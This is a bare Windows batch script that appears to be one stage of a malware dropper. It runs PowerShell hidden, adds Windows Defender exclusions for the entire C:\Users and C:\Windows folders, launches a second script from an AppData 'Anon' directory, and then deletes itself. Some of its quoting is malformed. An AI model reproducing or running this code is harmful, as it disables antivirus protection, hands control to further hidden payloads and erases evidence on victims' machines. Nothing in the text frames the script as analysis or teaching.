@echo off

powershell -window hidden -command ""

powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Users
powershell.exe -command "Add-MpPreference -ExclusionPath "C:\Windows

start C:\Users\%USERNAME%\AppData\Local\Anon\2.bat"

del "%~f0" & exit
